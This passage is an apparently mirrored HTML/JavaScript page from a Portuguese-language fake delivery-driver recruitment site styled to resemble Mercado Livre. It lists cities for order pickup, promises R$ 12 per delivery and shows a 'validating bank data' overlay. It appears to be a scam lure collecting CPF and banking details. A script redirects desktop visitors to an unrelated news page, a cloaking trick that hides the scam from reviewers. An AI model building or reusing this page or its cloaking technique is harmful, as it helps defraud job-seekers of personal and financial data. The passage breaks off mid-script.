@@ -1,0 +1,1474 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from informacoesconfirmadas.shop/municipios.html? by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Mar 2026 21:25:08 GMT -->
+<head>
+    <script src="scripts/utms/latest-1.html" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Escolha os Municípios</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="css2-13585.html?family=Inter:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ml-yellow: #FFE600;
+            --ml-yellow-dark: #E6CF00;
+            --ml-yellow-light: #FFF9C4;
+            --ml-yellow-extra-light: #FFFDE7;
+            --ml-blue: #3483FA;
+            --ml-blue-dark: #2968C8;
+            --ml-blue-light: #E8F4FD;
+            --ml-dark: #333333;
+            --ml-gray: #666666;
+            --ml-gray-light: #999999;
+            --ml-bg-light: #F5F5F5;
+            --ml-white: #FFFFFF;
+            --ml-green: #00A650;
+            --ml-red: #F23D4F;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--ml-dark);
+            line-height: 1.6;
+            background: var(--ml-white);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            background: var(--ml-yellow);
+            padding: 12px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo-img {
+            height: 40px;
+            width: auto;
+        }
+
+        /* Header Badge - Motorista Parceiro */
+        .header-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--ml-blue);
+            padding: 6px 12px;
+            border-radius: 25px;
+        }
+
+        .header-badge-icon {
+            color: var(--ml-yellow);
+            display: flex;
+            align-items: center;
+        }
+
+        .header-badge-icon svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        .header-badge-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.1;
+        }
+
+        .header-badge-title {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--ml-white);
+        }
+
+        .header-badge-subtitle {
+            font-size: 10px;
+            font-weight: 400;
+            color: rgba(255,255,255,0.9);
+        }
+
+        @media (max-width: 400px) {
+            .header-badge {
+                padding: 5px 10px;
+            }
+            
+            .header-badge-title {
+                font-size: 11px;
+            }
+            
+            .header-badge-subtitle {
+                font-size: 9px;
+            }
+            
+            .header-badge-icon svg {
+                width: 14px;
+                height: 14px;
+            }
+        }
+
+        /* Perfil do Entregador */
+        .perfil-entregador {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-bottom: 1px solid #dee2e6;
+            padding: 12px 20px;
+        }
+
+        .perfil-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .perfil-avatar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+            border: 2px solid var(--ml-blue);
+            background: var(--ml-blue-light);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .perfil-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .perfil-avatar svg {
+            width: 24px;
+            height: 24px;
+            color: var(--ml-blue);
+        }
+
+        .perfil-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .perfil-label {
+            font-size: 11px;
+            color: var(--ml-gray-light);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 2px;
+        }
+
+        .perfil-nome {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--ml-dark);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .perfil-cpf {
+            font-size: 13px;
+            color: var(--ml-gray);
+            font-weight: 500;
+        }
+
+        .perfil-badge {
+            background: var(--ml-green);
+            color: white;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            white-space: nowrap;
+        }
+
+        @media (max-width: 480px) {
+            .perfil-entregador {
+                padding: 10px 15px;
+            }
+
+            .perfil-avatar {
+                width: 40px;
+                height: 40px;
+            }
+
+            .perfil-avatar svg {
+                width: 20px;
+                height: 20px;
+            }
+
+            .perfil-nome {
+                font-size: 14px;
+            }
+
+            .perfil-cpf {
+                font-size: 12px;
+            }
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            padding: 30px 20px;
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .page-title {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--ml-dark);
+            text-align: center;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+
+        .page-description {
+            font-size: 15px;
+            color: var(--ml-gray);
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        /* Estado Header */
+        .estado-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--ml-blue-light);
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+        }
+
+        .estado-label {
+            font-size: 14px;
+            color: var(--ml-dark);
+            font-weight: 600;
+        }
+
+        .estado-label span {
+            color: var(--ml-blue);
+            font-weight: 700;
+        }
+
+        .estado-info {
+            font-size: 12px;
+            color: var(--ml-gray);
+            margin-top: 4px;
+        }
+
+        .btn-marcar-todos {
+            background: var(--ml-blue);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-marcar-todos:hover {
+            background: var(--ml-blue-dark);
+        }
+
+        .btn-marcar-todos.active {
+            background: var(--ml-red);
+        }
+
+        /* Search Box */
+        .search-box {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            color: var(--ml-gray-light);
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 14px 14px 14px 44px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .search-input:focus {
+            outline: none;
+            border-color: var(--ml-blue);
+            box-shadow: 0 0 0 3px rgba(52, 131, 250, 0.1);
+        }
+
+        /* Cidades Container */
+        .cidades-container {
+            background: var(--ml-bg-light);
+            border-radius: 16px;
+            padding: 16px;
+            max-height: 400px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+        }
+
+        .loading-cidades {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            color: var(--ml-gray);
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid var(--ml-blue-light);
+            border-top-color: var(--ml-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 12px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .cidades-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 10px;
+        }
+
+        .cidade-item {
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+        }
+
+        .cidade-item:hover {
+            border-color: var(--ml-blue);
+            background: var(--ml-blue-light);
+        }
+
+        .cidade-item.selected {
+            border-color: var(--ml-green);
+            background: #E8F5E9;
+        }
+
+        .cidade-item.hidden {
+            display: none;
+        }
+
+        .cidade-nome {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--ml-dark);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .cidade-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #ccc;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: all 0.2s;
+        }
+
+        .cidade-checkbox svg {
+            width: 14px;
+            height: 14px;
+            color: white;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+
+        .cidade-item.selected .cidade-checkbox {
+            background: var(--ml-green);
+            border-color: var(--ml-green);
+        }
+
+        .cidade-item.selected .cidade-checkbox svg {
+            opacity: 1;
+        }
+
+        /* Counter */
+        .counter-info {
+            text-align: center;
+            font-size: 14px;
+            color: var(--ml-gray);
+            margin-bottom: 20px;
+        }
+
+        .counter-info span {
+            font-weight: 700;
+            color: var(--ml-blue);
+        }
+
+        /* Previsão de Entregas */
+        .previsao-container {
+            background: linear-gradient(135deg, #FFF9C4 0%, #FFFDE7 100%);
+            border: 2px solid var(--ml-yellow);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .previsao-container.active {
+            display: block;
+        }
+
+        .previsao-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--ml-dark);
+            margin-bottom: 8px;
+        }
+
+        .previsao-subtitle {
+            font-size: 13px;
+            color: var(--ml-gray);
+            margin-bottom: 16px;
+        }
+
+        .previsao-destaque {
+            background: var(--ml-yellow);
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 16px;
+        }
+
+        .previsao-destaque p {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--ml-dark);
+            text-align: center;
+        }
+
+        .previsao-lista {
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .previsao-item {
+            display: grid;
+            grid-template-columns: 1fr auto auto;
+            gap: 10px;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(0,0,0,0.1);
+            align-items: center;
+        }
+
+        .previsao-item:last-child {
+            border-bottom: none;
+        }
+
+        .previsao-cidade {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--ml-dark);
+        }
+
+        .previsao-entregas {
+            font-size: 12px;
+            color: var(--ml-gray);
+        }
+
+        .previsao-entregas span {
+            font-weight: 700;
+            color: var(--ml-blue);
+        }
+
+        .previsao-valor {
+            font-size: 12px;
+            color: var(--ml-gray);
+        }
+
+        .previsao-valor span {
+            font-weight: 700;
+            color: var(--ml-green);
+        }
+
+        .previsao-total {
+            display: grid;
+            grid-template-columns: 1fr auto auto;
+            gap: 10px;
+            padding: 12px;
+            background: white;
+            border-radius: 10px;
+            margin-top: 12px;
+            align-items: center;
+        }
+
+        .previsao-total .previsao-cidade {
+            font-weight: 700;
+        }
+
+        .previsao-total .previsao-entregas span,
+        .previsao-total .previsao-valor span {
+            font-size: 14px;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            width: 100%;
+            background: var(--ml-blue);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-submit:hover:not(:disabled) {
+            background: var(--ml-blue-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(52, 131, 250, 0.4);
+        }
+
+        .btn-submit:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--ml-yellow);
+            padding: 30px 20px;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        .footer-logo {
+            margin-bottom: 15px;
+        }
+
+        .footer-logo img {
+            height: 40px;
+            width: auto;
+        }
+
+        .footer p {
+            font-size: 13px;
+            color: var(--ml-dark);
+            margin-bottom: 5px;
+        }
+
+        .footer-copy {
+            font-size: 12px;
+            color: var(--ml-gray);
+            margin-top: 10px;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--ml-yellow);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-logo {
+            margin-bottom: 30px;
+        }
+
+        .loading-logo img {
+            height: 60px;
+            width: auto;
+        }
+
+        .loading-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--ml-dark);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .loading-box {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .loading-step {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 16px 0;
+            transition: all 0.3s ease;
+            border-bottom: 1px solid rgba(0,0,0,0.08);
+        }
+
+        .loading-step:last-child {
+            border-bottom: none;
+        }
+
+        .loading-step.pending {
+            opacity: 0.4;
+        }
+
+        .loading-step.active,
+        .loading-step.completed {
+            opacity: 1;
+        }
+
+        .loading-step-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 16px;
+            font-weight: 700;
+            color: rgba(0,0,0,0.3);
+        }
+
+        .loading-step.active .loading-step-icon,
+        .loading-step.completed .loading-step-icon {
+            background: var(--ml-blue);
+            color: white;
+        }
+
+        .loading-step-icon svg {
+            width: 24px;
+            height: 24px;
+            color: white;
+        }
+
+        .loading-step-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--ml-dark);
+        }
+
+        .loading-step.pending .loading-step-text {
+            color: rgba(0,0,0,0.4);
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        /* Popup */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--ml-yellow);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 20px;
+        }
+
+        .popup-overlay.active {
+            display: flex;
+        }
+
+        .popup-logo {
+            margin-bottom: 30px;
+        }
+
+        .popup-logo img {
+            height: 60px;
+            width: auto;
+        }
+
+        .popup-main-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--ml-dark);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .popup-box {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .popup-icon {
+            width: 70px;
+            height: 70px;
+            background: var(--ml-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .popup-icon svg {
+            width: 36px;
+            height: 36px;
+            color: white;
+        }
+
+        .popup-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--ml-dark);
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .popup-text {
+            font-size: 14px;
+            color: var(--ml-gray);
+            margin-bottom: 24px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .popup-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 24px;
+        }
+
+        .popup-option {
+            padding: 16px;
+            background: rgba(255,255,255,0.5);
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            color: rgba(0,0,0,0.4);
+            cursor: pointer;
+            transition: all 0.2s;
+            border-bottom: 1px solid rgba(0,0,0,0.08);
+        }
+
+        .popup-option:last-child {
+            border-bottom: none;
+        }
+
+        .popup-option:hover {
+            background: rgba(255,255,255,0.8);
+            color: var(--ml-dark);
+        }
+
+        .popup-option.selected {
+            background: var(--ml-blue);
+            color: white;
+        }
+
+        .popup-btn {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255,255,255,0.5);
+            color: rgba(0,0,0,0.3);
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: not-allowed;
+            transition: all 0.3s;
+        }
+
+        .popup-btn.enabled {
+            background: var(--ml-blue);
+            color: white;
+            cursor: pointer;
+        }
+
+        .popup-btn.enabled:hover {
+            background: var(--ml-blue-dark);
+        }
+
+        /* Error message */
+        .error-message {
+            background: #FFEBEE;
+            border: 1px solid var(--ml-red);
+            color: var(--ml-red);
+            padding: 12px 16px;
+            border-radius: 10px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .error-message.active {
+            display: block;
+        }
+    </style>
+<script>
+  window.pixelId = "6987d3b2e68b6f5a7bf9e036";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "../cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script src="../cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+<script type="text/javascript">
+    // Verifica o dispositivo e redireciona antes de carregar outros recursos
+    if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+      window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+    }
+  </script>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <img src="053Pbb0T/image-1.png" alt="" style="width: 40px; height: auto;">
+                <div style="display: flex; flex-direction: column; line-height: 1.05;">
+                    <span style="font-size: 20px; font-weight: 700; color: #2D3277;">mercado</span>
+                    <span style="font-size: 20px; font-weight: 700; color: #2D3277;">entregadores</span>
+                </div>
+            </div>
+            <div class="header-badge">
+                <div class="header-badge-icon">
+                    <svg viewbox="0 0 24 24" fill="currentColor">
+                        <path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"></path>
+                        <path d="M4.59 16.59L9.17 12 4.59 7.41 6 6l6 6-6 6-1.41-1.41z"></path>
+                    </svg>
+                </div>
+                <div class="header-badge-text">
+                    <span class="header-badge-title">Motorista Parceiro</span>
+                    <span class="header-badge-subtitle">Mercado Entregadores</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Perfil do Entregador -->
+    <div class="perfil-entregador">
+        <div class="perfil-content">
+            <div class="perfil-avatar">
+                <img src="MG1K2RMB/MOTORISTA.png" alt="Foto do Entregador">
+            </div>
+            <div class="perfil-info">
+                <div class="perfil-label">Entregador Parceiro</div>
+                <div class="perfil-nome" id="perfilNome">Carregando...</div>
+                <div class="perfil-cpf" id="perfilCpf">CPF: ---</div>
+            </div>
+            <div class="perfil-badge">✓ Verificado</div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-logo">
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <img src="053Pbb0T/image-1.png" alt="" style="width: 50px; height: auto;">
+                <div style="display: flex; flex-direction: column; line-height: 1.05;">
+                    <span style="font-size: 24px; font-weight: 700; color: #2D3277;">mercado</span>
+                    <span style="font-size: 24px; font-weight: 700; color: #2D3277;">entregadores</span>
+                </div>
+            </div>
+        </div>
+        <h2 class="loading-title">Processando Informações</h2>
+        <div class="loading-box">
+            <div class="loading-step pending" id="loadStep1">
+                <div class="loading-step-icon">1</div>
+                <span class="loading-step-text">Validando dados bancários</span>
+            </div>
+            <div class="loading-step pending" id="loadStep2">
+                <div class="loading-step-icon">2</div>
+                <span class="loading-step-text">Registrando método de recebimento</span>
+            </div>
+            <div class="loading-step pending" id="loadStep3">
+                <div class="loading-step-icon">3</div>
+                <span class="loading-step-text">Configurando conta para pagamentos</span>
+            </div>
+            <div class="loading-step pending" id="loadStep4">
+                <div class="loading-step-icon">4</div>
+                <span class="loading-step-text">Verificando segurança das informações</span>
+            </div>
+            <div class="loading-step pending" id="loadStep5">
+                <div class="loading-step-icon">5</div>
+                <span class="loading-step-text">Concluindo registro financeiro</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Popup Oportunidade -->
+    <div class="popup-overlay" id="popupOportunidade">
+        <div class="popup-logo">
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <img src="053Pbb0T/image-1.png" alt="" style="width: 50px; height: auto;">
+                <div style="display: flex; flex-direction: column; line-height: 1.05;">
+                    <span style="font-size: 24px; font-weight: 700; color: #2D3277;">mercado</span>
+                    <span style="font-size: 24px; font-weight: 700; color: #2D3277;">entregadores</span>
+                </div>
+            </div>
+        </div>
+        <h2 class="popup-main-title">Temos entregas disponíveis!</h2>
+        <div class="popup-box">
+            <p class="popup-text">Escolha quando você quer começar a trabalhar como motorista parceiro:</p>
+            <div class="popup-options" id="popupOptions">
+                <!-- Opções serão inseridas dinamicamente -->
+            </div>
+            <button class="popup-btn" id="btnContinuarPopup">Continuar</button>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <h1 class="page-title">Escolha onde retirar os pedidos</h1>
+        <p class="page-description">Selecione as cidades onde você pode retirar os pedidos no Centro de distribuição do Mercado Entregadores. Em cada cidade abaixo está localizado um centro de distribuição e de acordo com a sua disponibilidade pode estar escolhendo mais de 1 centro para retirar os pedidos.</p>
+
+        <div class="estado-header">
+            <div>
+                <span class="estado-label">Estado: <span id="estadoNome">SP</span></span>
+                <p class="estado-info" id="estadoInfo">Carregando cidades...</p>
+            </div>
+            <button class="btn-marcar-todos" id="btnMarcarTodos">Marcar Todos</button>
+        </div>
+
+        <div class="error-message" id="errorMessage">
+            Erro ao carregar as cidades. Por favor, recarregue a página.
+        </div>
+
+        <div class="search-box">
+            <svg class="search-icon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="11" cy="11" r="8"></circle>
+                <path d="M21 21l-4.35-4.35"></path>
+            </svg>
+            <input type="text" class="search-input" id="searchCidade" placeholder="Buscar cidade...">
+        </div>
+
+        <div class="cidades-container">
+            <div class="loading-cidades" id="loadingCidades">
+                <div class="loading-spinner"></div>
+                <p>Carregando cidades da API do IBGE...</p>
+            </div>
+            <div class="cidades-grid" id="cidadesGrid"></div>
+        </div>
+
+        <p class="counter-info"><span id="cidadesSelecionadas">0</span> cidade(s) selecionada(s)</p>
+
+        <!-- Previsão de Entregas -->
+        <div class="previsao-container" id="previsaoContainer">
+            <h3 class="previsao-title">Previsão de Entregas</h3>
+            <p class="previsao-subtitle">Quantidade média diária de entregas que podem ser destinadas a você:</p>
+            
+            <div class="previsao-destaque">
+                <p>O Mercado Entregadores paga R$ 12,00 por entrega realizada</p>
+            </div>
+
+            <div class="previsao-lista" id="previsaoLista">
+                <!-- Items dinâmicos aqui -->
+            </div>
+
+            <div class="previsao-total" id="previsaoTotal">
+                <p class="previsao-cidade">Total diário:</p>
+                <p class="previsao-entregas"><span id="totalEntregas">0</span> entregas</p>
+                <p class="previsao-valor"><span id="totalValor">R$ 0,00</span> /dia</p>
+            </div>
+        </div>
+
+        <button class="btn-submit" id="btnProsseguir" disabled>Prosseguir</button>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-logo">
+            <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
+                <img src="053Pbb0T/image-1.png" alt="" style="width: 40px; height: auto;">
+                <div style="display: flex; flex-direction: column; line-height: 1.05;">
+                    <span style="font-size: 20px; font-weight: 700; color: #2D3277;">mercado</span>
+                    <span style="font-size: 20px; font-weight: 700; color: #2D3277;">entregadores</span>
+                </div>
+            </div>
+        </div>
+        <p>© 2025 Mercado Entregadores. Todos os direitos reservados.</p>
+        <p><strong>Programa de Parceiros Entregadores</strong></p>
+        <p>Trabalhe conosco e faça parte da nossa equipe de entregas</p>
+    </footer>
+
+    <script>
+        // Capturar parâmetros da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        
+        // Mapeamento de siglas de estados para códigos do IBGE
+        const estadosIBGE = {
+            'AC': 12, 'AL': 27, 'AP': 16, 'AM': 13, 'BA': 29,
+            'CE': 23, 'DF': 53, 'ES': 32, 'GO': 52, 'MA': 21,
+            'MT': 51, 'MS': 50, 'MG': 31, 'PA': 15, 'PB': 25,
+            'PR': 41, 'PE': 26, 'PI': 22, 'RJ': 33, 'RN': 24,
+            'RS': 43, 'RO': 11, 'RR': 14, 'SC': 42, 'SP': 35,
+            'SE': 28, 'TO': 17
+        };
+
+        // Nomes completos dos estados
+        const nomesEstados = {
+            'AC': 'Acre', 'AL': 'Alagoas', 'AP': 'Amapá', 'AM': 'Amazonas',
+            'BA': 'Bahia', 'CE': 'Ceará', 'DF': 'Distrito Federal', 'ES': 'Espírito Santo',
+            'GO': 'Goiás', 'MA': 'Maranhão', 'MT': 'Mato Grosso', 'MS': 'Mato Grosso do Sul',
+            'MG': 'Minas Gerais', 'PA': 'Pará', 'PB': 'Paraíba', 'PR': 'Paraná',
+            'PE': 'Pernambuco', 'PI': 'Piauí', 'RJ': 'Rio de Janeiro', 'RN': 'Rio Grande do Norte',
+            'RS': 'Rio Grande do Sul', 'RO': 'Rondônia', 'RR': 'Roraima', 'SC': 'Santa Catarina',
+            'SP': 'São Paulo', 'SE': 'Sergipe', 'TO': 'Tocantins'
+        };
+
+        // Get estado from localStorage (userData object)
+        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+        
+        // Preencher userData com parâmetros da URL (prioridade para URL)
+        urlParams.forEach((value, key) => {
+            userData[key] = value;
+        });
+        localStorage.setItem('userData', JSON.stringify(userData));
+        
+        let estadoSelecionado = userData.estado || 'SP';
+        
+        console.log('Estado selecionado:', estadoSelecionado);
+        console.log('Dados do usuário:', userData);
+        
+        // Carregar dados do perfil
+        function carregarPerfil() {
+            const nome = userData.nome || 'Não informado';
+            const cpf = userData.cpf || '000.000.000-00';
+            
+            // Formatar CPF para exibição parcial (privacidade)
+            const cpfFormatado = cpf.replace(/(\d{3})\.(\d{3})\.(\d{3})-(\d{2})/, '$1.***.***-$4');
+            
+            document.getElementById('perfilNome').textContent = nome;
+            document.getElementById('perfilCpf').textContent = 'CPF: ' + cpfFormatado;
+        }
+        
+        // Carregar perfil ao iniciar
+        carregarPerfil();
+        
+        // Update estado name display
+        document.getElementById('estadoNome').textContent = estadoSelecionado + ' - ' + (nomesEstados[estadoSelecionado] || estadoSelecionado);
+
+        // Variables
+        const cidadesGrid = document.getElementById('cidadesGrid');
+        const loadingCidades = document.getElementById('loadingCidades');
+        const btnMarcarTodos = document.getElementById('btnMarcarTodos');
+        const btnProsseguir = document.getElementById('btnProsseguir');
+        const cidadesSelecionadasEl = document.getElementById('cidadesSelecionadas');
+        const errorMessage = document.getElementById('errorMessage');
+        const estadoInfo = document.getElementById('estadoInfo');
+        let cidadesSelecionadas = [];
+        let todasMarcadas = false;
+        let todasCidades = [];
+
+        // Função para buscar TODAS as cidades do estado via API do IBGE
+        async function buscarCidadesIBGE(siglaEstado) {
+            const codigoIBGE = estadosIBGE[siglaEstado];
+            
+            if (!codigoIBGE) {
+                throw new Error('Estado não encontrado: ' + siglaEstado);
+            }
+
+            const url = `https://servicodados.ibge.gov.br/api/v1/localidades/estados/${codigoIBGE}/municipios?orderBy=nome`;
+            
+            console.log('Buscando cidades do IBGE:', url);
+            
+            const response = await fetch(url);
+            
+            if (!response.ok) {
+                throw new Error('Erro ao buscar cidades: ' + response.status);
+            }
+            
+            const municipios = await response.json();
+            
+            // Extrair apenas os nomes das cidades
+            return municipios.map(m => m.nome);
+        }
+
+        // Load cidades da API do IBGE
+        async function carregarCidades() {
+            try {
+                loadingCidades.style.display = 'flex';
+                errorMessage.classList.remove('active');
+                cidadesGrid.innerHTML = '';
+                
+                // Buscar cidades da API do IBGE
+                todasCidades = await buscarCidadesIBGE(estadoSelecionado);
+                
+                console.log(`Total de cidades em ${estadoSelecionado}:`, todasCidades.length);
+                
+                // Atualizar info do estado
+                estadoInfo.textContent = `${todasCidades.length} municípios disponíveis`;
+                
+                // Esconder loading
+                loadingCidades.style.display = 'none';
+                
+                // Renderizar todas as cidades
+                todasCidades.forEach(cidade => {
+                    const cidadeItem = document.createElement('div');
+                    cidadeItem.className = 'cidade-item';
+                    cidadeItem.dataset.cidade = cidade;
+                    cidadeItem.innerHTML = `
+                        <span class="cidade-nome" title="${cidade}">${cidade}</span>
+                        <div class="cidade-checkbox">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                                <polyline points="20 6 9 17 4 12"/>
+                            </svg>
+                        </div>
+                    `;
+                    
+                    cidadeItem.addEventListener('click', () => toggleCidade(cidadeItem, cidade));
+                    cidadesGrid.appendChild(cidadeItem);
+                });
+                
+            } catch (error) {
+                console.error('Erro ao carregar cidades:', error);
+                loadingCidades.style.display = 'none';
+                errorMessage.classList.add('active');
+                estadoInfo.textContent = 'Erro ao carregar';
+            }
+        }
+
+        // Toggle cidade selection
+        function toggleCidade(element, cidade) {
+            element.classList.toggle('selected');
+            
+            if (element.classList.contains('selected')) {
+                cidadesSelecionadas.push(cidade);
+            } else {
+                cidadesSelecionadas = cidadesSelecionadas.filter(c => c !== cidade);
+            }
+            
+            updateCounter();
+            checkMarcarTodos();
+            atualizarPrevisao();
+        }
+
+        // Update counter
+        function updateCounter() {
+            cidadesSelecionadasEl.textContent = cidadesSelecionadas.length;
+            btnProsseguir.disabled = cidadesSelecionadas.length === 0;
+        }
+
+        // Atualizar previsão de entregas
+        function atualizarPrevisao() {
+            const previsaoContainer = document.getElementById('previsaoContainer');
+            const previsaoLista = document.getElementById('previsaoLista');
